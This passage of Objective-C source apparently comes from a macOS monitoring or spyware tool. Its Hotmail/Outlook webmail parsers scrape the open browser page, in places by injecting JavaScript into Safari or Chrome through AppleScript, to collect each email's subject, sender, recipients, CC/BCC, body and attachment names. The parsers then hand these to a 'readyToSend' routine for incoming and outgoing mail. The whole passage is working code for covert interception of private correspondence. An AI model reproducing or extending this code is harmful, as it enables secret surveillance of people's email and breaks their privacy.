//                if ([[spliter objectAtIndex:i] rangeOfString:@"@"].location != NSNotFound) {
//                    NSString *localtemp = [spliter objectAtIndex:i];
//                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@"(" withString:@""];
//                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@")" withString:@""];
//                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@"<" withString:@""];
//                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@">" withString:@""];
//                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@"\"" withString:@""];
//                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@";" withString:@""];
//                    localtemp = [localtemp stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
//                    
//                    if (![receiverEmail containsObject:localtemp]) {
//                        senderEmail = localtemp;
//                        tempName = [tempName stringByReplacingOccurrencesOfString:@"(" withString:@""];
//                        tempName = [tempName stringByReplacingOccurrencesOfString:@")" withString:@""];
//                        tempName = [tempName stringByReplacingOccurrencesOfString:@";" withString:@""];
//                        tempName = [tempName stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
//                        sender= tempName;
//                    }
//                    tempName=@"";
//                }else{
//                    if (tempName) {
//                        tempName = [NSString stringWithFormat:@"%@ %@ ",tempName,[spliter objectAtIndex:i]];
//                    }else{
//                        tempName = [spliter objectAtIndex:i];
//                    }
//                }
//            }
//            
//            NSAppleScript *scpt5 = [[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function myValue() { return document.getElementById('ItemHeader.ToContainer').textContent +' '+ document.getElementById('ItemHeader.CcContainer').textContent +' '+ document.getElementById('ItemHeader.BccContainer').textContent;} myValue();\" in document 1 \n return the result \n end tell"];
//            NSAppleEventDescriptor * scptResult5 = [scpt5 executeAndReturnError:nil];
//            spliter = [[scptResult5 stringValue] componentsSeparatedByString:@" "];
//            [scpt5 release];
//            
//            tempName = @"";
//            for (int i=0; i < [spliter count]; i++) {
//                if ([[spliter objectAtIndex:i] rangeOfString:@"@"].location != NSNotFound) {
//                    NSString *localtemp = [spliter objectAtIndex:i];
//                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@"(" withString:@""];
//                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@")" withString:@""];
//                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@"<" withString:@""];
//                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@">" withString:@""];
//                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@"\"" withString:@""];
//                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@";" withString:@""];
//                    localtemp = [localtemp stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
//                    
//                    if (![receiverEmail containsObject:localtemp]) {
//                        [receiverEmail addObject:localtemp];
//                        tempName = [tempName stringByReplacingOccurrencesOfString:@"(" withString:@""];
//                        tempName = [tempName stringByReplacingOccurrencesOfString:@")" withString:@""];
//                        tempName = [tempName stringByReplacingOccurrencesOfString:@";" withString:@""];
//                        tempName = [tempName stringByReplacingOccurrencesOfString:@"..." withString:@""];
//                        tempName = [tempName stringByReplacingOccurrencesOfString:@"Cc:" withString:@""];
//                        tempName = [tempName stringByReplacingOccurrencesOfString:@"To:" withString:@""];
//                        tempName = [tempName stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
//                        [receiver addObject:tempName];
//                    }
//                    tempName=@"";
//                }else{
//                    if (tempName) {
//                        tempName = [NSString stringWithFormat:@"%@ %@ ",tempName,[spliter objectAtIndex:i]];
//                    }else{
//                        tempName = [spliter objectAtIndex:i];
//                    }
//                }
//            }
//
//            NSAppleScript *scpt6 = [[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function myValue() { return document.getElementById('Item.MessagePartBody').innerHTML; } myValue();\" in document 1 \n return the result \n end tell"];
//            NSAppleEventDescriptor * scptResult6 = [scpt6 executeAndReturnError:nil];
//            messageBody = [scptResult6 stringValue];
//            //[messageBody writeToFile:[NSString stringWithFormat:@"/Users/%@/Desktop/web_mail.html", NSUserName()] atomically:YES encoding:NSUTF8StringEncoding error:nil];
//            [scpt6 release];
//            
//            NSAppleScript *scpt7 = [[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function myValue() { var a = ''; var x = document.getElementsByClassName('attachmentWell')[0].getElementsByTagName('td'); for(var i=0;i<x.length;i++){if(a){a=a+','+x[i].childNodes[0].childNodes[0].getAttribute('aria-label');}else{a=x[i].childNodes[0].childNodes[0].getAttribute('aria-label');}} return a; } myValue();\" in document 1 \n return the result \n end tell"];
//            NSAppleEventDescriptor * scptResult7 = [scpt7 executeAndReturnError:nil];
//            NSArray * attachSpliter = [[scptResult7 stringValue] componentsSeparatedByString:@","];
//            for (int i=0; i<[attachSpliter count]; i++) {
//                [attachment addObject:[attachSpliter objectAtIndex:i]];
//            }
//
//            [scpt7 release];
            
        }else if ([aType isEqualToString:@"Google Chrome"]) {

            DLog(@"New Version Chrome");

//            NSAppleScript * scpt1 = [[NSAppleScript alloc]initWithSource:@"delay 2.5 \n tell application \"Google Chrome\" \n execute front window's active tab javascript \"function myValue() { var x = document.getElementsByClassName('_rp_H1'); for(var i=0;i < x.length; i++){ var c = x[i].getElementsByTagName('BUTTON'); if(c){ for(var j=0;j < c.length; j++){ var v = c[j].getAttribute('aria-checked'); if(v){ if(v.indexOf('false') != -1 ){ c[j].click(); } } } } } } myValue();\" \n return the result \n end tell"];
//            [scpt1 executeAndReturnError:nil];
//            [scpt1 release];
//            sleep(0.75);
//
//            NSAppleScript * scpt2 = [[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function myValue() {var myVar = document.getElementsByClassName('_rp_i')[0].textContent; return myVar;} myValue();\" \n return the result \n end tell"];
//            NSAppleEventDescriptor * scptResult2 =[scpt2 executeAndReturnError:nil];
//            subject = [scptResult2 stringValue];
//            [scpt2 release];
//            
//            
//            NSAppleScript * scpt3 = [[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function myValue() { return document.getElementsByClassName('ms-font-s _rp_z1 _rp_u1')[0].textContent;} myValue();\" \n return the result \n end tell"];
//            NSAppleEventDescriptor * scptResult3 = [scpt3 executeAndReturnError:nil];
//            sentDate = [scptResult3 stringValue];
//            [scpt3 release];
//            
//            
//            NSAppleScript * scpt4 = [[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function myValue() { return document.getElementsByClassName('ms-font-s _rp_z1 _rp_v1')[0].textContent;} myValue();\" \n return the result \n end tell"];
//            NSAppleEventDescriptor * scptResult4 = [scpt4 executeAndReturnError:nil];
//            sender = [scptResult4 stringValue];
//            [scpt4 release];
//            
//            NSArray * spliter = [sender componentsSeparatedByString:@" "];
//            NSString * tempName = @"";
//            for (int i=0; i < [spliter count]; i++) {
//                if ([[spliter objectAtIndex:i] rangeOfString:@"@"].location != NSNotFound) {
//                    NSString *localtemp = [spliter objectAtIndex:i];
//                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@"(" withString:@""];
//                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@")" withString:@""];
//                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@"<" withString:@""];
//                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@">" withString:@""];
//                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@"\"" withString:@""];
//                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@";" withString:@""];
//                    localtemp = [localtemp stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
//                    
//                    if (![receiverEmail containsObject:localtemp]) {
//                        senderEmail = localtemp;
//                        tempName = [tempName stringByReplacingOccurrencesOfString:@"(" withString:@""];
//                        tempName = [tempName stringByReplacingOccurrencesOfString:@")" withString:@""];
//                        tempName = [tempName stringByReplacingOccurrencesOfString:@";" withString:@""];
//                        tempName = [tempName stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
//                        sender = tempName;
//                    }
//                    tempName=@"";
//                }else{
//                    if (tempName) {
//                        tempName = [NSString stringWithFormat:@"%@ %@ ",tempName,[spliter objectAtIndex:i]];
//                    }else{
//                        tempName = [spliter objectAtIndex:i];
//                    }
//                }
//            }
//            
//            NSAppleScript * scpt5  = [[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function myValue() { return  document.getElementById('ItemHeader.ToContainer').textContent +' '+ document.getElementById('ItemHeader.CcContainer').textContent +' '+ document.getElementById('ItemHeader.BccContainer').textContent;} myValue();\" \n return the result \n end tell"];
//            NSAppleEventDescriptor * scptResult5 = [scpt5 executeAndReturnError:nil];
//            spliter = [[scptResult5 stringValue] componentsSeparatedByString:@" "];
//            [scpt5 release];
//            
//            tempName = @"";
//            for (int i=0; i < [spliter count]; i++) {
//                if ([[spliter objectAtIndex:i] rangeOfString:@"@"].location != NSNotFound) {
//                    NSString *localtemp = [spliter objectAtIndex:i];
//                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@"(" withString:@""];
//                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@")" withString:@""];
//                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@"<" withString:@""];
//                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@">" withString:@""];
//                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@"\"" withString:@""];
//                    localtemp = [localtemp stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
//                    
//                    if (![receiverEmail containsObject:localtemp]) {
//                        [receiverEmail addObject:localtemp];
//                        tempName = [tempName stringByReplacingOccurrencesOfString:@"(" withString:@""];
//                        tempName = [tempName stringByReplacingOccurrencesOfString:@")" withString:@""];
//                        tempName = [tempName stringByReplacingOccurrencesOfString:@";" withString:@""];
//                        tempName = [tempName stringByReplacingOccurrencesOfString:@";" withString:@""];
//                        tempName = [tempName stringByReplacingOccurrencesOfString:@"..." withString:@""];
//                        tempName = [tempName stringByReplacingOccurrencesOfString:@"Cc:" withString:@""];
//                        tempName = [tempName stringByReplacingOccurrencesOfString:@"To:" withString:@""];
//                        tempName = [tempName stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
//                        [receiver addObject:tempName];
//                    }
//                    tempName=@"";
//                }else{
//                    if (tempName) {
//                        tempName = [NSString stringWithFormat:@"%@ %@ ",tempName,[spliter objectAtIndex:i]];
//                    }else{
//                        tempName = [spliter objectAtIndex:i];
//                    }
//                }
//            }
//            
//            NSAppleScript * scpt6  = [[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function myValue() { return document.getElementById('Item.MessagePartBody').innerHTML; } myValue();\" \n return the result \n end tell"];
//            NSAppleEventDescriptor * scptResult6 = [scpt6 executeAndReturnError:nil];
//            messageBody = [scptResult6 stringValue];
//            //[messageBody writeToFile:[NSString stringWithFormat:@"/Users/%@/Desktop/web_mail.html", NSUserName()] atomically:YES encoding:NSUTF8StringEncoding error:nil];
//            [scpt6 release];
//            
//            NSAppleScript * scpt7 = [[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function myValue() { var a = ''; var x = document.getElementsByClassName('attachmentWell')[0].getElementsByTagName('td'); for(var i=0;i<x.length;i++){if(a){a=a+','+x[i].childNodes[0].childNodes[0].getAttribute('aria-label');}else{a=x[i].childNodes[0].childNodes[0].getAttribute('aria-label');}} return a; } myValue();\" \n return the result \n end tell"];
//            NSAppleEventDescriptor * scptResult7 = [scpt7 executeAndReturnError:nil];
//            NSArray * attachSpliter = [[scptResult7 stringValue] componentsSeparatedByString:@","];
//            for (int i=0; i<[attachSpliter count]; i++) {
//                [attachment addObject:[attachSpliter objectAtIndex:i]];
//            }
//      
//            [scpt7 release];
        }
      
        [WebmailHTMLParser readyToSend_subject:subject sender:sender senderEmail:senderEmail senderImageUrl:senderImageUrl sentDate:sentDate receiver:receiver receiverEmail:receiverEmail receiverImageUrl:receiverImageUrl attachment:attachment messageBody:messageBody mailType:@"HOTMAIL" direction:kIncoming];
        [WebmailHTMLParser sharedWebmailHTMLParser].isUsingIncomingOutlook = false;
        
    }else{
        DLog(@"In Used");
    }
    DLog(@"End Hotmail_HTMLParser_Outlook_Incoming");
    
    [receiver release];
    [receiverEmail release];
    [attachment release];
}

+(void) Hotmail_HTMLParser_Outlook_Outgoing:(NSString *)aMyhtml {
    DLog(@"OUT Hotmail_HTMLParser_Outlook_Outgoing");
    NSString * subject =@"";
    NSString * sender =@"";
    NSString * senderEmail =@"";
    NSString * senderImageUrl =@"";
    NSMutableArray * receiver=[[NSMutableArray alloc]init];
    NSMutableArray * receiverEmail=[[NSMutableArray alloc]init];
    NSMutableArray * attachment=[[NSMutableArray alloc]init];
    NSString * receiverImageUrl =@"";
    NSString * sentDate =@"";
    NSString * messageBody =@"";

    NSString * clearHTML = [aMyhtml stringByReplacingOccurrencesOfString:@"&nbsp;" withString:@""];
    clearHTML = [clearHTML stringByReplacingOccurrencesOfString:@"&lt;" withString:@"<"];
    clearHTML = [clearHTML stringByReplacingOccurrencesOfString:@"&gt;" withString:@">"];
    clearHTML = [clearHTML stringByReplacingOccurrencesOfString:@"&quot;" withString:@"\""];
 
    if ([clearHTML rangeOfString:@"ol_cap"].location != NSNotFound) {
        if ([clearHTML rangeOfString:@"ol_subject=\""].location != NSNotFound) {
            NSArray * subString = [clearHTML componentsSeparatedByString:@"ol_subject=\""];
            subString = [[subString objectAtIndex:1] componentsSeparatedByString:@"\""];
            subject = [subString objectAtIndex:0];
        }
        
        if ([clearHTML rangeOfString:@"ol_receive=\""].location != NSNotFound) {
            NSArray * subString = [clearHTML componentsSeparatedByString:@"ol_receive=\""];
            subString = [[subString objectAtIndex:1] componentsSeparatedByString:@"\""];

            NSArray * spliter = [[subString objectAtIndex:0] componentsSeparatedByString:@" "];
            NSString * tempName = @"";
            for (int i=0; i < [spliter count]; i++) {
                if ([[spliter objectAtIndex:i] rangeOfString:@"@"].location != NSNotFound) {
                    NSString *localtemp = [spliter objectAtIndex:i];
                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@"(" withString:@""];
                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@")" withString:@""];
                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@"<" withString:@""];
                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@">" withString:@""];
                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@"\"" withString:@""];
                    localtemp = [localtemp stringByReplacingOccurrencesOfString:@";" withString:@""];
                    localtemp = [localtemp stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
                    
                    if (![receiverEmail containsObject:localtemp]) {
                        [receiverEmail addObject:localtemp];
                        tempName = [tempName stringByReplacingOccurrencesOfString:@"(" withString:@""];
                        tempName = [tempName stringByReplacingOccurrencesOfString:@")" withString:@""];
                        tempName = [tempName stringByReplacingOccurrencesOfString:@";" withString:@""];
                        tempName = [tempName stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
                        [receiver addObject:tempName];
                    }
                    tempName=@"";
                }else{
                    if (tempName) {
                        tempName = [NSString stringWithFormat:@"%@ %@ ",tempName,[spliter objectAtIndex:i]];
                    }else{
                        tempName = [spliter objectAtIndex:i];
                    }
                }
            }
        }
        
        if ([clearHTML rangeOfString:@"ol_sender=\""].location != NSNotFound) {
            NSArray * subString = [clearHTML componentsSeparatedByString:@"ol_sender=\""];
            subString = [[subString objectAtIndex:1] componentsSeparatedByString:@"\""];
            senderEmail = [subString objectAtIndex:0];
        }
        
        if ([clearHTML rangeOfString:@"ol_message=\""].location != NSNotFound) {
            NSArray * subString = [clearHTML componentsSeparatedByString:@"ol_message=\""];
            subString = [[subString objectAtIndex:1] componentsSeparatedByString:@"\" ol_attachment=\""];
            messageBody = [subString objectAtIndex:0];
            //[messageBody writeToFile:[NSString stringWithFormat:@"/Users/%@/Desktop/web_mail.html", NSUserName()] atomically:YES encoding:NSUTF8StringEncoding error:nil];
        }

        if ([clearHTML rangeOfString:@"ol_attachment=\""].location != NSNotFound) {
            NSArray * subString = [clearHTML componentsSeparatedByString:@"ol_attachment=\""];
            subString = [[subString objectAtIndex:1] componentsSeparatedByString:@"\""];

            NSArray * spliter = [[subString objectAtIndex:0] componentsSeparatedByString:@","];
            for (int i =0 ; i < [spliter count]; i++) {
                NSString * attachName = [[spliter objectAtIndex:i] stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
                [attachment addObject:attachName];
            }
        }
        
        sentDate = [WebmailHTMLParser roundUpSecond];
        
        [WebmailHTMLParser readyToSend_subject:subject sender:sender senderEmail:senderEmail senderImageUrl:senderImageUrl sentDate:sentDate receiver:receiver receiverEmail:receiverEmail receiverImageUrl:receiverImageUrl attachment:attachment messageBody:messageBody mailType:@"HOTMAIL" direction:kOutgoing];
    }

    DLog(@"End Hotmail_HTMLParser_Outlook_Outgoing");
    
    [receiver release];
    [receiverEmail release];
    [attachment release];
}

+(void) Hotmail_HTMLParser:(NSString *)aMyhtml {
    DLog(@"IN Hotmail_HTMLParser");
    NSString * subject =@"";
    NSString * sender =@"";
    NSString * senderEmail =@"";
    NSString * senderImageUrl =@"";
    NSMutableArray * receiver=[[NSMutableArray alloc]init];
    NSMutableArray * receiverEmail=[[NSMutableArray alloc]init];
    NSMutableArray * attachment=[[NSMutableArray alloc]init];
    NSString * receiverImageUrl =@"";
    NSString * sentDate =@"";
    NSString * messageBody =@"";
    
    NSString * clearHTML = [aMyhtml stringByReplacingOccurrencesOfString:@"&nbsp;" withString:@""];
    clearHTML = [clearHTML stringByReplacingOccurrencesOfString:@"&lt;" withString:@"<"];
    clearHTML = [clearHTML stringByReplacingOccurrencesOfString:@"&gt;" withString:@">"];
    clearHTML = [clearHTML stringByReplacingOccurrencesOfString:@"&quot;" withString:@"\""];
    
    if ([clearHTML rangeOfString:@"class=\"rmSubject\""].location != NSNotFound) {
        
        NSCharacterSet *set = [NSCharacterSet whitespaceCharacterSet];
        NSArray * temp = [clearHTML componentsSeparatedByString:@"class=\"rmSubject\">"];
        temp = [[temp objectAtIndex:1] componentsSeparatedByString:@"</h2>"];
        temp = [[temp objectAtIndex:0] componentsSeparatedByString:@"</script>"];
        
        for (int i=0; i < [temp count]; i++) {
            NSArray * localTemp = [[temp objectAtIndex:i] componentsSeparatedByString:@"<script"];
            for (int j=0; j<[localTemp count]; j++) {
                if ([[localTemp objectAtIndex:j] rangeOfString:@"type=\"jsv"].location == NSNotFound && [[[localTemp objectAtIndex:j] stringByTrimmingCharactersInSet: set] length] != 0) {
                    subject = [localTemp objectAtIndex:j];
                    break;
                }
            }
            if ([subject length]>0) {
                break;
            }
        }
    }
    
    if ([clearHTML rangeOfString:@"class=\"c_ic_tile_clip\""].location != NSNotFound) {
        NSArray * temp = [clearHTML componentsSeparatedByString:@"class=\"c_ic_tile_clip\""];
        temp = [[temp objectAtIndex:1] componentsSeparatedByString:@" src=\""];
        temp = [[temp objectAtIndex:1] componentsSeparatedByString:@"?"];
        receiverImageUrl = [temp objectAtIndex:0];
    }
    
    if ([clearHTML rangeOfString:@"class=\"c_ic_img_sub c_ic_img_mxl c_emptymenu\""].location == NSNotFound) {
        if ([clearHTML rangeOfString:@"class=\"c_ic_img_sub c_ic_img_mxl\""].location != NSNotFound) {
            NSArray * temp = [clearHTML componentsSeparatedByString:@"class=\"c_ic_img_sub c_ic_img_mxl\""];
            temp = [[temp objectAtIndex:1] componentsSeparatedByString:@" src=\""];
            temp = [[temp objectAtIndex:1] componentsSeparatedByString:@"?"];
            senderImageUrl = [temp objectAtIndex:0];
        }
    }

    if ([clearHTML rangeOfString:@"class=\"MediaItem File"].location != NSNotFound) {
        NSArray * splitertemp = [clearHTML componentsSeparatedByString:@"class=\"MediaItem File"];
        for (int i=0; i< [splitertemp count]; i++) {
            NSArray * temp;
            if ([[splitertemp objectAtIndex:i] rangeOfString:@"class=\"FileName\""].location != NSNotFound) {
                temp = [[splitertemp objectAtIndex:i] componentsSeparatedByString:@"class=\"FileName\""];
                temp = [[temp objectAtIndex:1] componentsSeparatedByString:@"</div>"];
                if ([[temp objectAtIndex:0]  rangeOfString:@"class=\"TextSizeSmall\""].location != NSNotFound) {
                    temp = [[temp objectAtIndex:0] componentsSeparatedByString:@"class=\"TextSizeSmall\">"];
                    temp = [[temp objectAtIndex:1] componentsSeparatedByString:@"</span>"];
                    [attachment addObject:[temp objectAtIndex:0]];
                }
            }
        }
    }
    
    if ([clearHTML rangeOfString:@"ReadMsgHeaderCol1"].location != NSNotFound) {
        NSArray *original;
        NSArray * temp = [clearHTML componentsSeparatedByString:@"ReadMsgHeaderCol1"];
        original = [temp copy];
        
        temp = [[temp objectAtIndex:1] componentsSeparatedByString:@":</td>"];
        temp = [[temp objectAtIndex:1] componentsSeparatedByString:@"</tr>"];
        temp = [[temp objectAtIndex:0] componentsSeparatedByString:@"<span>"];
        temp = [[temp objectAtIndex:1] componentsSeparatedByString:@"</span>"];
        NSString * stringTemp = [temp objectAtIndex:0];
        stringTemp = [stringTemp stringByReplacingOccurrencesOfString:@"<b>" withString:@""];
        stringTemp = [stringTemp stringByReplacingOccurrencesOfString:@"</b>" withString:@";"];
        NSArray * spliter = [stringTemp componentsSeparatedByString:@";"];
        
        sender = [spliter objectAtIndex:0];
        NSString *ClearEmail = [spliter objectAtIndex:([spliter count]-1)];
        ClearEmail = [ClearEmail stringByReplacingOccurrencesOfString:@"(" withString:@""];
        ClearEmail = [ClearEmail stringByReplacingOccurrencesOfString:@")" withString:@""];
        senderEmail = ClearEmail;
        if ([sender rangeOfString:@"@"].location !=NSNotFound && [senderEmail length]==0) {
            senderEmail = sender;
        }
        
        NSString * forDate = [original objectAtIndex:2];
        if ([forDate rangeOfString:@":</td>"].location != NSNotFound) {
            NSArray * temp = [forDate componentsSeparatedByString:@":</td>"];
            temp = [[temp objectAtIndex:1] componentsSeparatedByString:@"</tr>"];
            temp = [[temp objectAtIndex:0] componentsSeparatedByString:@"<td>"];
            temp = [[temp objectAtIndex:1] componentsSeparatedByString:@"</td>"];
            
            sentDate = [[temp objectAtIndex:0] stringByReplacingOccurrencesOfString:@" " withString:@""];
            
            //GG
            NSString * forReceiver = [original objectAtIndex:3];
            if ([forReceiver rangeOfString:@":</td>"].location != NSNotFound) {
                
                NSArray * temp = [forReceiver componentsSeparatedByString:@":</td>"];
                temp = [[temp objectAtIndex:1] componentsSeparatedByString:@"</tr>"];
                NSString * receiverTemp = [temp objectAtIndex:0];
                receiverTemp = [receiverTemp stringByReplacingOccurrencesOfString:@"</script>" withString:@""];
                receiverTemp = [receiverTemp stringByReplacingOccurrencesOfString:@"<script" withString:@""];
                temp = [receiverTemp componentsSeparatedByString:@"type="];
                
                for (int i=0; i<[temp count]; i++) {
                    if ([[temp objectAtIndex:i] rangeOfString:@"@"].location != NSNotFound) {
                        receiverTemp = [temp objectAtIndex:i];
                        break;
                    }
                }
                temp = [receiverTemp componentsSeparatedByString:@">"];
                temp = [[temp objectAtIndex:1] componentsSeparatedByString:@";"];
                
                for (int i=0; i<[temp count]; i++) {
                    NSArray * localTemp = [[temp objectAtIndex:i] componentsSeparatedByString:@" "];
                    NSString * tempName = @"";
                    for (int j=0; j < [localTemp count]; j++) {
                        if ([[localTemp objectAtIndex:j] rangeOfString:@"@"].location != NSNotFound) {
                            NSString *localstring = [localTemp objectAtIndex:j];
                            localstring = [localstring stringByReplacingOccurrencesOfString:@"(" withString:@""];
                            localstring = [localstring stringByReplacingOccurrencesOfString:@")" withString:@""];
                            localstring = [localstring stringByReplacingOccurrencesOfString:@";" withString:@""];
                            localstring = [localstring stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
                            if (![receiverEmail containsObject:localstring]) {
                                [receiverEmail addObject:localstring];
                                tempName = [tempName stringByReplacingOccurrencesOfString:@"(" withString:@""];
                                tempName = [tempName stringByReplacingOccurrencesOfString:@")" withString:@""];
                                tempName = [tempName stringByReplacingOccurrencesOfString:@";" withString:@""];
                                tempName = [tempName stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
                                [receiver addObject:tempName];
                            }
                            tempName=@"";
                        }else{
                            if (tempName) {
                                tempName = [NSString stringWithFormat:@"%@ %@ ",tempName,[localTemp objectAtIndex:j]];
                            }else{
                                tempName = [localTemp objectAtIndex:j];
                            }
                        }
                    }
                }
            }
            //GG
            if ([original count] == 5) {
                NSString * forReceiverCC = [original objectAtIndex:4];
                if ([forReceiverCC rangeOfString:@"Cc:"].location != NSNotFound) {
                    
                    NSArray * temp = [forReceiverCC componentsSeparatedByString:@":</td>"];
                    temp = [[temp objectAtIndex:1] componentsSeparatedByString:@"</tr>"];
                    NSString * receiverTemp = [temp objectAtIndex:0];
                    receiverTemp = [receiverTemp stringByReplacingOccurrencesOfString:@"</script>" withString:@""];
                    receiverTemp = [receiverTemp stringByReplacingOccurrencesOfString:@"<script" withString:@""];
                    temp = [receiverTemp componentsSeparatedByString:@"type="];
                    
                    for (int i=0; i<[temp count]; i++) {
                        if ([[temp objectAtIndex:i] rangeOfString:@"@"].location != NSNotFound) {
                            receiverTemp = [temp objectAtIndex:i];
                            break;
                        }
                    }
                    temp = [receiverTemp componentsSeparatedByString:@">"];
                    temp = [[temp objectAtIndex:1] componentsSeparatedByString:@";"];
                    
                    for (int i=0; i<[temp count]; i++) {
                        NSArray * localTemp = [[temp objectAtIndex:i] componentsSeparatedByString:@" "];
                        NSString * tempName = @"";
                        for (int j=0; j < [localTemp count]; j++) {
                            if ([[localTemp objectAtIndex:j] rangeOfString:@"@"].location != NSNotFound) {
                                NSString *localstring = [localTemp objectAtIndex:j];
                                localstring = [localstring stringByReplacingOccurrencesOfString:@"(" withString:@""];
                                localstring = [localstring stringByReplacingOccurrencesOfString:@")" withString:@""];
                                localstring = [localstring stringByReplacingOccurrencesOfString:@";" withString:@""];
                                localstring = [localstring stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
                                if (![receiverEmail containsObject:localstring]) {
                                    [receiverEmail addObject:localstring];
                                    tempName = [tempName stringByReplacingOccurrencesOfString:@"(" withString:@""];
                                    tempName = [tempName stringByReplacingOccurrencesOfString:@")" withString:@""];
                                    tempName = [tempName stringByReplacingOccurrencesOfString:@";" withString:@""];
                                    tempName = [tempName stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
                                    [receiver addObject:tempName];
                                }
                                tempName=@"";
                            }else{
                                if (tempName) {
                                    tempName = [NSString stringWithFormat:@"%@ %@ ",tempName,[localTemp objectAtIndex:j]];
                                }else{
                                    tempName = [localTemp objectAtIndex:j];
                                }
                            }
                        }
                    }
                }
            }
        }
        
        if ([clearHTML rangeOfString:@"class=\"readMsgBody\""].location != NSNotFound) {
            NSArray * temp = [clearHTML componentsSeparatedByString:@"class=\"readMsgBody\""];
            temp = [[temp objectAtIndex:1] componentsSeparatedByString:@"<div class=\"v-InboxFooterContainer\""];
            messageBody = [temp objectAtIndex:0];
            //[messageBody writeToFile:[NSString stringWithFormat:@"/Users/%@/Desktop/web_mail.html", NSUserName()] atomically:YES encoding:NSUTF8StringEncoding error:nil];
        }
        
        [WebmailHTMLParser readyToSend_subject:subject sender:sender senderEmail:senderEmail senderImageUrl:senderImageUrl sentDate:sentDate receiver:receiver receiverEmail:receiverEmail receiverImageUrl:receiverImageUrl attachment:attachment messageBody:messageBody mailType:@"HOTMAIL" direction:kIncoming];
    }
    DLog(@"End IN Hotmail_HTMLParser");
    
    [attachment release];
    [receiver release];
    [receiverEmail release];
}

+(void) Hotmail_HTMLParser_Outgoing:(NSString *)aMyhtml type:(NSString *)aType {
    DLog(@"OUT Hotmail_HTMLParser");
    
    NSString * subject =@"";
    NSString * sender =@"";
    NSString * senderEmail =@"";
    NSString * senderImageUrl =@"";
    NSMutableArray * receiver=[[NSMutableArray alloc]init];
    NSMutableArray * receiverEmail=[[NSMutableArray alloc]init];
    NSMutableArray * attachment=[[NSMutableArray alloc]init];
    NSString * receiverImageUrl =@"";
    NSString * sentDate =@"";
    NSString * messageBody =@"";
    
    NSString * clearHTML = [aMyhtml stringByReplacingOccurrencesOfString:@"&nbsp;" withString:@""];
    clearHTML = [clearHTML stringByReplacingOccurrencesOfString:@"&lt;" withString:@"<"];
    clearHTML = [clearHTML stringByReplacingOccurrencesOfString:@"&gt;" withString:@">"];
    clearHTML = [clearHTML stringByReplacingOccurrencesOfString:@"&quot;" withString:@"\""];
    
    if ([clearHTML rangeOfString:@"class=\"hm_cap_s\""].location != NSNotFound) {
        if ([aType isEqualToString:@"Safari"]) {
            NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function myValue() {var  myVar = document.getElementsByClassName('fSubject t_subj TextLightI WatermarkedInput')[0].value; return myVar;} myValue();\" in document 1 \n return the result \n end tell"];
            NSAppleEventDescriptor *scptResult =[scpt executeAndReturnError:nil];
            subject = [scptResult stringValue];
            [scpt release];
        }else if ([aType isEqualToString:@"Google Chrome"]) {
            NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function myValue() {var myVar = document.getElementsByClassName('fSubject t_subj TextLightI WatermarkedInput')[0].value; return myVar;} myValue();\" \n return the result \n end tell"];
            NSAppleEventDescriptor *scptResult =[scpt executeAndReturnError:nil];
            subject = [scptResult stringValue];
            [scpt release];
        }
        DLog(@"toCP");
        if ([clearHTML rangeOfString:@"id=\"toCP\""].location != NSNotFound) {
